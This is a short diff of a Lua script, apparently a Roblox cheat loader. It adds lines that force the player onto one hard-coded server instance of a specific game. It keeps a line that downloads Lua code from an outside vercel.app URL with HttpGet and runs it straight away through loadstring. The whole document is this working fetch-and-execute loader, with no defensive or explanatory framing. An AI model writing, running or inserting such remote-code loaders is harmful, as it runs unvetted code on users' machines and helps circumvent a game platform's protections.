@@ -1,4 +1,7 @@
-
+local a1=game:GetService("TeleportService")
+if game.PlaceId==136801880565837 and game.JobId~="40203c0f-9693-4f8a-ad37-104756a6d927"then
+a1:TeleportToPlaceInstance(136801880565837,"40203c0f-9693-4f8a-ad37-104756a6d927",game.Players.LocalPlayer)
+end
 
 loadstring(game:HttpGet("https://apigetunx.vercel.app/Modules/v2/Inv.lua",true))()
 
